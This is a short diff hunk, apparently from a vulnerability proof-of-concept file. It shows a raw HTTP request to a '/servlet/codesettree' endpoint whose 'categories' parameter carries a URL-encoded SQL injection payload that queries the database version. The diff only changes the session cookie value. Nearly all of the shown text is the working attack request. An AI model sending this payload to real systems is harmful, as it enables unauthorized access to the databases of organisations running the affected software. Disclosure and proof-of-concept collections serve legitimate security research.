@@ -75,7 +75,7 @@ payload:
 GET /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hellohongjingHcm~27~2c~40~40version~2d~2d HTTP/1.1
 Host: IP
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
-Cookie: JSESSIONID=5******************************3
+Cookie: JSESSIONID=52DCEBA606B3
 Accept-Encoding: gzip, deflate
 Connection: close
 
